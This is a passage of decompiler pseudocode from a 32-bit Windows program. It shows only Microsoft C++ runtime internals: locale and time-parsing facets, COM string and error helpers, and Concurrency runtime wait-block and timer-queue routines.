// 4915B0: using guessed type void *std::moneypunct<char,0>::`vftable';

//----- (00443B06) --------------------------------------------------------
int __cdecl sub_443B06(_DWORD *a1, std::locale *a2)
{
  _DWORD *v2; // esi
  char v3; // bl
  const char *v4; // eax
  std::_Locinfo *v5; // eax
  void *v7[13]; // [esp+10h] [ebp-48h] BYREF
  _DWORD *v8; // [esp+44h] [ebp-14h]
  int v9; // [esp+48h] [ebp-10h]
  int v10; // [esp+54h] [ebp-4h]

  v2 = 0;
  v3 = 0;
  v9 = 0;
  if ( a1 && !*a1 )
  {
    v8 = operator new(0x44u);
    v10 = 0;
    if ( v8 )
    {
      v4 = std::locale::c_str(a2);
      v5 = (std::_Locinfo *)std::_Locinfo::_Locinfo((std::_Locinfo *)v7, v4);
      v3 = 1;
      LOBYTE(v10) = 1;
      v9 = 1;
      v2 = sub_44371C(v8, v5, 0);
    }
    *a1 = v2;
    if ( (v3 & 1) != 0 )
      sub_42DB80(v7);
  }
  return 5;
}

//----- (00443B72) --------------------------------------------------------
int __cdecl sub_443B72(_DWORD *a1, std::locale *a2)
{
  char v2; // bl
  _DWORD *v3; // esi
  const char *v4; // eax
  int v5; // eax
  void *v7[13]; // [esp+10h] [ebp-44h] BYREF
  _DWORD *v8; // [esp+44h] [ebp-10h]
  int v9; // [esp+50h] [ebp-4h]

  v2 = 0;
  v8 = 0;
  if ( a1 && !*a1 )
  {
    v3 = operator new(0xCu);
    v8 = v3;
    v9 = 0;
    if ( v3 )
    {
      v4 = std::locale::c_str(a2);
      v5 = std::_Locinfo::_Locinfo((std::_Locinfo *)v7, v4);
      v3[1] = 0;
      *v3 = &std::time_put<char,std::ostreambuf_iterator<char>>::`vftable';
      v2 = 1;
      v3[2] = 0;
      sub_444AC0(v5);
    }
    else
    {
      v3 = 0;
    }
    *a1 = v3;
    if ( (v2 & 1) != 0 )
      sub_42DB80(v7);
  }
  return 5;
}
// 491644: using guessed type void *std::time_put<char,std::ostreambuf_iterator<char>>::`vftable';

//----- (00444AC0) --------------------------------------------------------
void __stdcall sub_444AC0(int a1)
{
  void *Block; // [esp+4h] [ebp-4h] BYREF

  Block = j___W_Gettnames();
  std::_Timevec::operator=(&Block);
  free(Block);
}
// 436BF0: using guessed type _DWORD __stdcall std::_Timevec::operator=(_DWORD);

//----- (004454CB) --------------------------------------------------------
_DWORD *__stdcall sub_4454CB(_DWORD *a1, int a2, int a3, int a4, _DWORD *Src)
{
  a1[4] = 0;
  a1[5] = 0;
  sub_40A530(a1, Src);
  return a1;
}

//----- (00445665) --------------------------------------------------------
int *__thiscall sub_445665(
        void *this,
        int *a2,
        int a3,
        int a4,
        int a5,
        int a6,
        int a7,
        int *a8,
        _DWORD *a9,
        char a10,
        int a11)
{
  int v12; // ebx
  struct std::_Facet_base *v13; // eax
  int *v14; // esi
  int v15; // ecx
  int *v16; // eax
  int v17; // ecx
  int v18; // ecx
  int v19; // eax
  int v20; // ecx
  int v21; // ecx
  int v22; // eax
  int v23; // ecx
  int *result; // eax
  int v25; // [esp-Ch] [ebp-38h]
  int v26; // [esp-Ch] [ebp-38h]
  _DWORD *v27; // [esp-8h] [ebp-34h]
  _DWORD *v28; // [esp-8h] [ebp-34h]
  int v29; // [esp-4h] [ebp-30h]
  int v30; // [esp-4h] [ebp-30h]
  int v31; // [esp+10h] [ebp-1Ch] BYREF
  int v32; // [esp+14h] [ebp-18h] BYREF
  char v33[4]; // [esp+18h] [ebp-14h] BYREF
  struct std::_Facet_base *v34; // [esp+1Ch] [ebp-10h]
  int v35; // [esp+28h] [ebp-4h]

  v12 = a7;
  std::locale::locale((std::locale *)&v31, *(const struct std::locale **)(a7 + 48));
  v35 = 0;
  v13 = sub_4306E3((std::locale *)&v31);
  v35 = -1;
  v34 = v13;
  sub_42DEE0(&v31);
  v14 = a8;
  v15 = a10 - 65;
  v32 = 0;
  *a8 = 0;
  switch ( v15 )
  {
    case 0:
    case 32:
      v16 = (int *)unknown_libname_83(&v31, a3, a4, a5, a6, v12, v14, a9);
      goto LABEL_3;
    case 1:
    case 33:
    case 39:
      v16 = (int *)unknown_libname_82(&v31, a3, a4, a5, a6, v12, v14, a9);
      goto LABEL_3;
    case 2:
      v17 = std::time_get<char,std::istreambuf_iterator<char>>::_Getint(this, &a3, &a5, 0, 99, &v32, v34) | *v14;
      *v14 = v17;
      if ( (v17 & 2) != 0 )
        break;
      v18 = 100 * (v32 - 19);
      goto LABEL_9;
    case 3:
      v16 = (int *)std::time_get<char,std::istreambuf_iterator<char>>::_Getfmt(
                     &v31,
                     a3,
                     a4,
                     a5,
                     a6,
                     v12,
                     v14,
                     a9,
                     "%m / %d / %y");
      goto LABEL_3;
    case 7:
      v30 = (int)v34;
      v28 = a9 + 2;
      v26 = 23;
      goto LABEL_15;
    case 8:
      v20 = std::time_get<char,std::istreambuf_iterator<char>>::_Getint(this, &a3, &a5, 1, 12, &v32, v34) | *v14;
      *v14 = v20;
      if ( (v20 & 2) == 0 )
        a9[2] = v32 != 12 ? v32 : 0;
      break;
    case 12:
      v30 = (int)v34;
      v28 = a9 + 1;
      v26 = 59;
      goto LABEL_15;
    case 17:
      v16 = (int *)std::time_get<char,std::istreambuf_iterator<char>>::_Getfmt(
                     &v31,
                     a3,
                     a4,
                     a5,
                     a6,
                     v12,
                     v14,
                     a9,
                     "%H : %M");
      goto LABEL_3;
    case 18:
      v30 = (int)v34;
      v28 = a9;
      v26 = 60;
      goto LABEL_15;
    case 19:
    case 23:
      v16 = (int *)std::time_get<char,std::istreambuf_iterator<char>>::_Getfmt(
                     &v31,
                     a3,
                     a4,
                     a5,
                     a6,
                     v12,
                     v14,
                     a9,
                     "%H : %M : %S");
      goto LABEL_3;
    case 20:
    case 22:
      v30 = (int)v34;
      v28 = a9 + 7;
      v26 = 53;
      goto LABEL_15;
    case 24:
      v16 = (int *)unknown_libname_84(v33, a3, a4, a5, a6, v12, v14, a9);
      goto LABEL_3;
    case 34:
      v16 = (int *)std::time_get<char,std::istreambuf_iterator<char>>::_Getfmt(
                     &v31,
                     a3,
                     a4,
                     a5,
                     a6,
                     v12,
                     v14,
                     a9,
                     "%b %d %H : %M : %S %Y");
      goto LABEL_3;
    case 35:
    case 36:
      v29 = (int)v34;
      v27 = a9 + 3;
      v25 = 31;
      goto LABEL_11;
    case 41:
      v29 = (int)v34;
      v27 = a9 + 7;
      v25 = 366;
LABEL_11:
      v19 = std::time_get<char,std::istreambuf_iterator<char>>::_Getint(this, &a3, &a5, 1, v25, v27, v29);
      goto LABEL_12;
    case 44:
      v21 = std::time_get<char,std::istreambuf_iterator<char>>::_Getint(this, &a3, &a5, 1, 12, &v32, v34) | *v14;
      *v14 = v21;
      if ( (v21 & 2) == 0 )
        a9[4] = v32 - 1;
      break;
    case 45:
    case 51:
      v16 = (int *)std::time_get<char,std::istreambuf_iterator<char>>::_Getfmt(&v31, a3, a4, a5, a6, v12, v14, a9, " ");
      goto LABEL_3;
    case 47:
      v22 = std::_Getloctxt<char,std::istreambuf_iterator<char>>((int)&a3, (int)&a5, 0, (int)":AM:am:PM:pm");
      if ( v22 >= 0 )
      {
        if ( v22 > 1 )
          a9[2] += 12;
      }
      else
      {
        *v14 |= 2u;
      }
      break;
    case 49:
      v16 = (int *)std::time_get<char,std::istreambuf_iterator<char>>::_Getfmt(
                     &v31,
                     a3,
                     a4,
                     a5,
                     a6,
                     v12,
                     v14,
                     a9,
                     "%I : %M : %S %p");
      goto LABEL_3;
    case 54:
      v30 = (int)v34;
      v28 = a9 + 6;
      v26 = 6;
LABEL_15:
      v19 = std::time_get<char,std::istreambuf_iterator<char>>::_Getint(this, &a3, &a5, 0, v26, v28, v30);
LABEL_12:
      *v14 |= v19;
      break;
    case 55:
      v16 = (int *)std::time_get<char,std::istreambuf_iterator<char>>::_Getfmt(
                     &v31,
                     a3,
                     a4,
                     a5,
                     a6,
                     v12,
                     v14,
                     a9,
                     "%d / %m / %y");
LABEL_3:
      a3 = *v16;
      a4 = v16[1];
      break;
    case 56:
      v23 = std::time_get<char,std::istreambuf_iterator<char>>::_Getint(this, &a3, &a5, 0, 99, &v32, v34) | *v14;
      *v14 = v23;
      if ( (v23 & 2) == 0 )
      {
        v18 = v32;
        if ( v32 < 69 )
          v18 = v32 + 100;
LABEL_9:
        a9[5] = v18;
      }
      break;
    default:
      *v14 = 2;
      break;
  }
  if ( (unsigned __int8)std::istreambuf_iterator<char>::equal(&a5) )
    *v14 |= 1u;
  result = a2;
  *a2 = a3;
  a2[1] = a4;
  return result;
}
// 433DD0: using guessed type _DWORD __stdcall std::istreambuf_iterator<char>::equal(_DWORD);
// 442D40: using guessed type _DWORD __stdcall unknown_libname_82(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 442D78: using guessed type _DWORD __stdcall unknown_libname_83(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 442DB0: using guessed type _DWORD __stdcall unknown_libname_84(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 443BE6: using guessed type _DWORD __stdcall std::time_get<char,std::istreambuf_iterator<char>>::_Getfmt(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 443D16: using guessed type _DWORD __cdecl std::time_get<char,std::istreambuf_iterator<char>>::_Getint(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 445665: using guessed type char var_14[4];

//----- (0044603A) --------------------------------------------------------
_DWORD *__thiscall sub_44603A(void *this, _DWORD *a2, int a3, int a4, char a5, int a6, int a7, _DWORD *a8, int a9)
{
  struct std::_Facet_base *v10; // eax
  struct std::_Facet_base *v11; // esi
  int v12; // eax
  int v13; // eax
  _DWORD *result; // eax
  int v15; // [esp+10h] [ebp-14h] BYREF
  int v16[3]; // [esp+14h] [ebp-10h] BYREF
  int v17; // [esp+20h] [ebp-4h]

  std::locale::locale((std::locale *)&v15, *(const struct std::locale **)(a7 + 48));
  v17 = 0;
  v10 = sub_4306E3((std::locale *)&v15);
  v17 = -1;
  v11 = v10;
  sub_42DEE0(&v15);
  v16[0] = 0;
  v12 = std::time_get<char,std::istreambuf_iterator<char>>::_Getint(this, &a3, &a5, 0, 9999, v16, v11);
  *a8 |= v12;
  if ( (v12 & 2) == 0 )
  {
    v13 = v16[0];
    if ( v16[0] >= 69 )
    {
      if ( v16[0] >= 100 )
        v13 = v16[0] - 1900;
    }
    else
    {
      v13 = v16[0] + 100;
    }
    *(_DWORD *)(a9 + 20) = v13;
  }
  result = a2;
  *a2 = a3;
  a2[1] = a4;
  return result;
}
// 443D16: using guessed type _DWORD __cdecl std::time_get<char,std::istreambuf_iterator<char>>::_Getint(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 44603A: using guessed type int var_10[3];

//----- (004460ED) --------------------------------------------------------
void **__thiscall sub_4460ED(void **this, void **a2)
{
  sub_409D70(a2, this[6]);
  return a2;
}

//----- (0044775B) --------------------------------------------------------
void __cdecl sub_44775B(void *Block)
{
  j__free(Block);
}

//----- (00447769) --------------------------------------------------------
_DWORD *__thiscall sub_447769(_DWORD *Block, char a2)
{
  *Block = &type_info::`vftable';
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}
// 4937CC: using guessed type void *type_info::`vftable';

//----- (00447DEF) --------------------------------------------------------
void __cdecl sub_447DEF(void *Block)
{
  j_j__free(Block);
}

//----- (00448031) --------------------------------------------------------
int sub_448031()
{
  __scrt_initialize_default_local_stdio_options();
  return 0;
}
// 44893C: using guessed type int __scrt_initialize_default_local_stdio_options(void);

//----- (00448039) --------------------------------------------------------
int sub_448039()
{
  int v0; // eax

  sub_4485C3();
  v0 = UserMathErrorFunction();
  return _set_new_mode(v0);
}

//----- (0044857D) --------------------------------------------------------
int __cdecl UserMathErrorFunction()
{
  return 0;
}

//----- (004485C3) --------------------------------------------------------
LPTOP_LEVEL_EXCEPTION_FILTER sub_4485C3()
{
  return SetUnhandledExceptionFilter(__scrt_unhandled_exception_filter);
}

//----- (00448625) --------------------------------------------------------
void sub_448625()
{
  dword_4FFFA8 = 0;
}
// 4FFFA8: using guessed type int dword_4FFFA8;

//----- (00448909) --------------------------------------------------------
void sub_448909()
{
  InitializeSListHead(&stru_4FFFB8);
}

//----- (00448936) --------------------------------------------------------
void *sub_448936()
{
  return &unk_4FFFC0;
}

//----- (00448959) --------------------------------------------------------
BOOL sub_448959()
{
  return dword_4F8040 == 0;
}
// 4F8040: using guessed type int dword_4F8040;

//----- (00448965) --------------------------------------------------------
void *sub_448965()
{
  return &unk_500C60;
}

//----- (0044896B) --------------------------------------------------------
void *sub_44896B()
{
  return &unk_500C5C;
}

//----- (00448971) --------------------------------------------------------
void sub_448971()
{
  ;
}
// 448971: could not find valid save-restore pair for edi

//----- (0044899D) --------------------------------------------------------
void __cdecl sub_44899D()
{
  ;
}
// 44899D: could not find valid save-restore pair for edi

//----- (00448A00) --------------------------------------------------------
void __stdcall __noreturn sub_448A00(int a1)
{
  off_4F8050(off_4F8050, a1, 0);
}
// 4F8050: using guessed type int (__thiscall *off_4F8050)(_DWORD, _DWORD, _DWORD);

//----- (00448A20) --------------------------------------------------------
BSTR __stdcall sub_448A20(LPCCH lpMultiByteStr)
{
  unsigned int v2; // ecx
  int v3; // eax
  int v4; // edi
  int v5; // eax
  void *v6; // esp
  _BYTE *v7; // esi
  BSTR v8; // ebx
  int LastError; // eax
  int v10; // eax
  _BYTE v11[16]; // [esp+0h] [ebp-38h] BYREF
  int cbMultiByte; // [esp+10h] [ebp-28h]
  int v13; // [esp+14h] [ebp-24h]
  _BYTE *v14; // [esp+18h] [ebp-20h]
  CPPEH_RECORD ms_exc; // [esp+20h] [ebp-18h]

  if ( !lpMultiByteStr )
    return 0;
  v2 = strlen(lpMultiByteStr);
  cbMultiByte = v2 + 1;
  if ( v2 + 1 > 0x7FFFFFFF )
    sub_448A00(-2147024809);
  v3 = MultiByteToWideChar(0, 0, lpMultiByteStr, v2 + 1, 0, 0);
  v4 = v3;
  v13 = v3;
  if ( !v3 )
  {
    LastError = GetLastError();
    if ( LastError > 0 )
      LastError = (unsigned __int16)LastError | 0x80070000;
    sub_448A00(LastError);
  }
  ms_exc.registration.TryLevel = 0;
  v5 = 2 * v3;
  if ( v4 >= 4096 )
  {
    v7 = malloc(2 * v4);
    v14 = v7;
  }
  else
  {
    v6 = alloca(v5);
    ms_exc.old_esp = (DWORD)v11;
    v7 = v11;
    v14 = v11;
  }
  ms_exc.registration.TryLevel = -2;
  if ( !v7 )
    goto LABEL_14;
  if ( !MultiByteToWideChar(0, 0, lpMultiByteStr, cbMultiByte, (LPWSTR)v7, v4) )
  {
    if ( v4 >= 4096 )
      free(v7);
    v10 = GetLastError();
    if ( v10 > 0 )
      v10 = (unsigned __int16)v10 | 0x80070000;
    sub_448A00(v10);
  }
  v8 = SysAllocString((const OLECHAR *)v7);
  if ( v4 >= 4096 )
    free(v7);
  if ( !v8 )
LABEL_14:
    sub_448A00(-2147024882);
  return v8;
}

//----- (00448BB0) --------------------------------------------------------
_DWORD *__thiscall sub_448BB0(_DWORD *this, int a2)
{
  int v3; // ecx

  *this = &off_49381C;
  this[1] = *(_DWORD *)(a2 + 4);
  v3 = *(_DWORD *)(a2 + 8);
  this[2] = v3;
  this[3] = 0;
  if ( v3 )
    (*(void (__thiscall **)(_DWORD, int))(*(_DWORD *)v3 + 4))(*(_DWORD *)(*(_DWORD *)v3 + 4), v3);
  return this;
}
// 49381C: using guessed type int (__thiscall *off_49381C)(void *Block, char);

//----- (00448BF0) --------------------------------------------------------
_DWORD *__thiscall sub_448BF0(_DWORD *this, int a2, int a3, char a4)
{
  *this = &off_49381C;
  this[1] = a2;
  this[2] = a3;
  this[3] = 0;
  if ( a3 && a4 )
    (*(void (__thiscall **)(_DWORD, int))(*(_DWORD *)a3 + 4))(*(_DWORD *)(*(_DWORD *)a3 + 4), a3);
  return this;
}
// 49381C: using guessed type int (__thiscall *off_49381C)(void *Block, char);

//----- (00448C40) --------------------------------------------------------
HLOCAL __thiscall sub_448C40(void *this)
{
  int v2; // ecx
  HLOCAL result; // eax

  v2 = *((_DWORD *)this + 2);
  *(_DWORD *)this = &off_49381C;
  if ( v2 )
    (*(void (__thiscall **)(_DWORD, int))(*(_DWORD *)v2 + 8))(*(_DWORD *)(*(_DWORD *)v2 + 8), v2);
  result = (HLOCAL)*((_DWORD *)this + 3);
  if ( result )
    return LocalFree(*((HLOCAL *)this + 3));
  return result;
}
// 49381C: using guessed type int (__thiscall *off_49381C)(void *Block, char);

//----- (00448C80) --------------------------------------------------------
void *__thiscall sub_448C80(void *Block, char a2)
{
  int v3; // ecx

  v3 = *((_DWORD *)Block + 2);
  *(_DWORD *)Block = &off_49381C;
  if ( v3 )
    (*(void (__thiscall **)(_DWORD, int))(*(_DWORD *)v3 + 8))(*(_DWORD *)(*(_DWORD *)v3 + 8), v3);
  if ( *((_DWORD *)Block + 3) )
    LocalFree(*((HLOCAL *)Block + 3));
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}
// 49381C: using guessed type int (__thiscall *off_49381C)(void *Block, char);

//----- (00448CD0) --------------------------------------------------------
void __cdecl __noreturn sub_448CD0(int a1, int a2)
{
  _DWORD pExceptionObject[4]; // [esp+0h] [ebp-10h] BYREF

  sub_448BF0(pExceptionObject, a1, a2, 0);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI1_AV_com_error__);
}
// 448CD0: using guessed type _DWORD pExceptionObject[4];

//----- (00448CF5) --------------------------------------------------------
int __thiscall sub_448CF5(int this, int a2, char a3, unsigned __int8 a4)
{
  int result; // eax

  sub_448E0F((_DWORD *)this);
  *(_DWORD *)(this + 24) = a2 + a4;
  *(_DWORD *)this = &Concurrency::details::MultiWaitBlock::`vftable';
  *(_DWORD *)(this + 12) = 0;
  *(_DWORD *)(this + 16) = 0;
  *(_DWORD *)(this + 20) = 0;
  *(_DWORD *)(this + 32) = 0;
  *(_BYTE *)(this + 40) = a3;
  result = this;
  *(_DWORD *)(this + 36) = 0;
  *(_BYTE *)(this + 41) = 0;
  return result;
}
// 493894: using guessed type void *Concurrency::details::MultiWaitBlock::`vftable';

//----- (00448D31) --------------------------------------------------------
_DWORD *__thiscall sub_448D31(_DWORD *this, char a2, int a3, char a4, unsigned __int8 a5)
{
  _DWORD *v6; // ebx
  int v7; // ecx
  int v8; // edx
  int v10; // [esp-4h] [ebp-10h]

  this[5] = 0;
  v10 = 8 * a3 + 48;
  *this = 48;
  this[1] = 8;
  this[2] = v10;
  v6 = (_DWORD *)unknown_libname_86(v10);
  this[3] = v6;
  this[4] = v6;
  if ( a2 )
  {
    sub_448CF5((int)v6, a3, a4, a5);
    *v6 = &Concurrency::details::WaitAllBlock::`vftable';
    v6[7] = a3;
  }
  else
  {
    sub_448DE7(v6, a3, a4, a5);
  }
  v7 = *this + this[3];
  if ( a3 )
  {
    v8 = a3;
    do
    {
      *(_DWORD *)(v7 + 4) = this[4];
      v7 += this[1];
      --v8;
    }
    while ( v8 );
  }
  this[6] = a3 + 1 + a5;
  return this;
}
// 447DE6: using guessed type int __cdecl unknown_libname_86(_DWORD);
// 4938B0: using guessed type void *Concurrency::details::WaitAllBlock::`vftable';

//----- (00448DB8) --------------------------------------------------------
int __thiscall sub_448DB8(int this, char a2)
{
  int result; // eax

  sub_448E0F((_DWORD *)this);
  *(_DWORD *)this = &Concurrency::details::TimedSingleWaitBlock::`vftable';
  *(_DWORD *)(this + 16) = 0;
  *(_BYTE *)(this + 24) = a2;
  result = this;
  *(_DWORD *)(this + 28) = 0;
  *(_DWORD *)(this + 32) = 0;
  *(_BYTE *)(this + 36) = 0;
  *(_DWORD *)(this + 16) = this;
  return result;
}
// 4938E8: using guessed type void *Concurrency::details::TimedSingleWaitBlock::`vftable';

//----- (00448DE7) --------------------------------------------------------
_DWORD *__thiscall sub_448DE7(_DWORD *this, int a2, char a3, unsigned __int8 a4)
{
  _DWORD *result; // eax

  sub_448CF5((int)this, a2, a3, a4);
  *this = &Concurrency::details::WaitAnyBlock::`vftable';
  result = this;
  this[7] = 1;
  return result;
}
// 4938CC: using guessed type void *Concurrency::details::WaitAnyBlock::`vftable';

//----- (00448E0F) --------------------------------------------------------
_DWORD *__thiscall sub_448E0F(_DWORD *this)
{
  this[1] = 0;
  *this = &Concurrency::details::WaitBlock::`vftable';
  this[2] = 0;
  this[1] = sub_44AEE0();
  return this;
}
// 44AEE0: using guessed type int sub_44AEE0(void);
// 493864: using guessed type void *Concurrency::details::WaitBlock::`vftable';

//----- (00448E2F) --------------------------------------------------------
_DWORD *__thiscall sub_448E2F(_DWORD *this)
{
  *this = 0;
  sub_449EFD(this + 1);
  return this;
}

//----- (00448E4C) --------------------------------------------------------
_DWORD *__thiscall sub_448E4C(_DWORD *this)
{
  this[1] = 0;
  *this = 0;
  sub_449EFD(this + 2);
  return this;
}

//----- (00448E6D) --------------------------------------------------------
void __thiscall sub_448E6D(_DWORD *this)
{
  int v1; // eax
  _DWORD *v2; // eax

  v1 = this[1];
  *this = &Concurrency::details::_MallocaArrayHolder<Concurrency::Context *>::`vftable';
  if ( v1 )
  {
    v2 = (_DWORD *)(v1 - 8);
    if ( *v2 == 56797 )
      free(v2);
  }
}
// 493900: using guessed type void *Concurrency::details::_MallocaArrayHolder<Concurrency::Context *>::`vftable';

//----- (00448E8D) --------------------------------------------------------
unsigned int __thiscall sub_448E8D(_DWORD *this)
{
  void *v2; // ecx
  unsigned int v3; // eax
  unsigned int result; // eax

  while ( 1 )
  {
    v3 = this[5];
    if ( v3 >= this[6] )
      break;
    v2 = (void *)this[4];
    ++this[5];
    sub_449173(v2);
  }
  result = v3 + 1;
  this[5] = result;
  return result;
}

//----- (00448EAB) --------------------------------------------------------
void __thiscall sub_448EAB(_DWORD *this)
{
  sub_44A2FF(this + 1);
  sub_449742(this);
}
// 40F6A0: using guessed type _DWORD _guard_check_icall_nop();

//----- (00448EF7) --------------------------------------------------------
void __thiscall sub_448EF7(_DWORD *this)
{
  _DWORD **v2; // esi
  _DWORD *v3; // ebx
  _DWORD **v4; // ecx
  _DWORD *v5; // esi

  sub_44A2FF(this + 2);
  v2 = (_DWORD **)*this;
  if ( *this > 1u )
  {
    do
    {
      v3 = *v2;
      if ( (unsigned __int8)sub_4491C1((int (__thiscall ****)(_DWORD, _DWORD, _DWORD))v2, 0) )
        sub_448F9B(v2);
      v2 = (_DWORD **)v3;
    }
    while ( v3 );
  }
  v4 = (_DWORD **)this[1];
  if ( v4 )
  {
    do
    {
      v5 = *v4;
      sub_448F9B(v4);
      v4 = (_DWORD **)v5;
    }
    while ( v5 );
  }
}
// 40F6A0: using guessed type _DWORD _guard_check_icall_nop();

//----- (00448F79) --------------------------------------------------------
_DWORD *__thiscall sub_448F79(_DWORD *Block, char a2)
{
  sub_448E6D(Block);
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}

//----- (00448F9B) --------------------------------------------------------
int __thiscall sub_448F9B(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[1] + 8))(this[1]);
}

//----- (00448FB5) --------------------------------------------------------
void __thiscall sub_448FB5(volatile signed __int32 *Block)
{
  if ( _InterlockedIncrement(Block + 7) == 2 )
    sub_44775B((void *)Block);
}

//----- (00448FD3) --------------------------------------------------------
void __stdcall sub_448FD3(int a1, void *Block, int a3)
{
  char v3; // bl
  int v4; // [esp+8h] [ebp-4h]

  v3 = 0;
  if ( _InterlockedIncrement((volatile signed __int32 *)Block + 5) == 1 )
  {
    v3 = 1;
    v4 = *((_DWORD *)Block + 1);
    *((_BYTE *)Block + 41) = 1;
    if ( v4 )
    {
      *((_DWORD *)Block + 3) = 0;
      (*(void (__thiscall **)(int))(*(_DWORD *)v4 + 12))(v4);
    }
  }
  sub_449173(Block);
  if ( v3 )
    sub_44ADA7(a1, a3);
}

//----- (00449031) --------------------------------------------------------
HMODULE __stdcall sub_449031(int a1, int (__thiscall ***a2)(_DWORD, _DWORD, _DWORD), int a3)
{
  HMODULE result; // eax

  result = (HMODULE)(**a2)(a2, 0, 0);
  if ( (_BYTE)result )
    return sub_44ADA7(a1, a3);
  return result;
}

//----- (00449064) --------------------------------------------------------
void __stdcall sub_449064(void *Block, int a2)
{
  int v2; // ebx
  void *v3; // esi
  void *v4; // eax

  if ( _InterlockedIncrement((volatile signed __int32 *)Block + 5) == 1 )
  {
    v2 = *((_DWORD *)Block + 1);
    v3 = (void *)*((_DWORD *)Block + 4);
    v4 = (void *)sub_4490DF();
    sub_44A727(v4, v3, 0);
    *((_BYTE *)Block + 41) = 1;
    if ( v2 )
    {
      *((_DWORD *)Block + 3) = 0;
      (*(void (__thiscall **)(int))(*(_DWORD *)v2 + 12))(v2);
    }
  }
  sub_449173(Block);
}

//----- (004490BD) --------------------------------------------------------
void __stdcall sub_4490BD(PVOID a1, BOOLEAN a2)
{
  (**(void (__thiscall ***)(PVOID, _DWORD, _DWORD))a1)(a1, 0, 0);
}

//----- (004490DF) --------------------------------------------------------
int sub_4490DF()
{
  bool v0; // zf
  char v2[8]; // [esp+0h] [ebp-1Ch] BYREF
  int v3; // [esp+8h] [ebp-14h]
  int (*v4)(); // [esp+Ch] [ebp-10h]
  _DWORD pExceptionObject[3]; // [esp+10h] [ebp-Ch] BYREF

  if ( sub_44CE8E() >= 3 || dword_4FFFCC )
    return dword_4FFFCC;
  if ( _InterlockedCompareExchange(&dword_4FFFC8, 1, 0) )
  {
    v3 = 0;
    v4 = sub_44AE9C;
    while ( !dword_4FFFCC && dword_4FFFC8 == 1 )
      sub_449592((int)v2);
  }
  else
  {
    dword_4FFFCC = (int)CreateTimerQueue();
    v0 = dword_4FFFCC == 0;
    if ( dword_4FFFCC )
      goto LABEL_11;
    _InterlockedExchange(&dword_4FFFC8, 0);
  }
  v0 = dword_4FFFCC == 0;
LABEL_11:
  if ( v0 )
  {
    sub_42E414(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVbad_alloc_std__);
  }
  return dword_4FFFCC;
}
// 44CE8E: using guessed type int sub_44CE8E(void);
// 4FFFC8: using guessed type int dword_4FFFC8;
// 4FFFCC: using guessed type int dword_4FFFCC;
// 4490DF: using guessed type char var_1C[8];
// 4490DF: using guessed type _DWORD pExceptionObject[3];

//----- (00449173) --------------------------------------------------------
void __thiscall sub_449173(void *Block)
{
  int v1; // eax

  v1 = *((_DWORD *)Block + 6);
  if ( _InterlockedIncrement((volatile signed __int32 *)Block + 9) == v1 + 1 )
    j_j__free(Block);
}

//----- (0044918C) --------------------------------------------------------
char __thiscall sub_44918C(volatile signed __int32 *Block)
{
  int v1; // edi
  signed __int32 v2; // edx
  signed __int32 v3; // eax

  v1 = *((_DWORD *)Block + 7);
  v2 = *((_DWORD *)Block + 8);
  if ( v2 == v1 )
  {
LABEL_4:
    sub_449173((void *)Block);
    return 0;
  }
  else
  {
    while ( 1 )
    {
      v3 = _InterlockedCompareExchange(Block + 8, v2 - 1, v2);
      if ( v3 == v2 )
        return 1;
      v2 = v3;
      if ( v3 == v1 )
        goto LABEL_4;
    }
  }
}

//----- (004491C1) --------------------------------------------------------
int __thiscall sub_4491C1(int (__thiscall ****this)(_DWORD, _DWORD, _DWORD), int a2)
{
  return (**this[1])(this[1], a2, this);
}

//----- (004491E3) --------------------------------------------------------
char __thiscall sub_4491E3(_DWORD *this, _DWORD *a2, int a3)
{
  int v3; // edi

  if ( *(_DWORD *)(*(_DWORD *)(a3 + 4) + 8) == 2
    || _InterlockedCompareExchange((volatile signed __int32 *)(*(_DWORD *)(a3 + 4) + 8), 1, 0) == 2 )
  {
    v3 = this[1];
    if ( a2 )
      *a2 = v3;
    else
      (*(void (__thiscall **)(int))(*(_DWORD *)v3 + 12))(v3);
  }
  else if ( a2 )
  {
    *a2 = 0;
  }
  return 0;
}

//----- (0044923D) --------------------------------------------------------
char __thiscall sub_44923D(int this, _DWORD *a2, int a3)
{
  int v4; // edi

  if ( _InterlockedIncrement((volatile signed __int32 *)(this + 32)) != 1 )
    return 0;
  sub_4496F5(this, a3 != 0);
  *(_BYTE *)(this + 36) = a3 == 0;
  v4 = *(_DWORD *)(this + 4);
  if ( a2 )
    *a2 = v4;
  else
    (*(void (__thiscall **)(int))(*(_DWORD *)v4 + 12))(v4);
  return 1;
}

//----- (00449296) --------------------------------------------------------
char __thiscall sub_449296(volatile signed __int32 *Block, _DWORD *a2, int a3)
{
  if ( a2 )
    *a2 = 0;
  if ( _InterlockedIncrement(Block + 8) != *((_DWORD *)Block + 7) )
    return 1;
  (*(void (__thiscall **)(volatile signed __int32 *, _DWORD *, int))(*Block + 20))(Block, a2, a3);
  sub_449173((void *)Block);
  return 0;
}

//----- (004492DD) --------------------------------------------------------
char __thiscall sub_4492DD(volatile signed __int32 *Block, _DWORD *a2, int a3)
{
  if ( a2 )
    *a2 = 0;
  if ( _InterlockedIncrement(Block + 8) == *((_DWORD *)Block + 7) )
    (*(void (__thiscall **)(volatile signed __int32 *, _DWORD *, int))(*Block + 20))(Block, a2, a3);
  sub_449173((void *)Block);
  return 0;
}

//----- (00449320) --------------------------------------------------------
signed __int32 __thiscall sub_449320(volatile signed __int32 *this)
{
  unsigned int v1; // edi
  signed __int32 result; // eax
  unsigned int v3; // ebx

  v1 = *this;
  for ( result = _InterlockedCompareExchange(this, 1, *this);
        result != v1;
        result = _InterlockedCompareExchange(this, 1, result) )
  {
    v1 = result;
  }
  if ( v1 > 1 )
  {
    do
    {
      v3 = *(_DWORD *)v1;
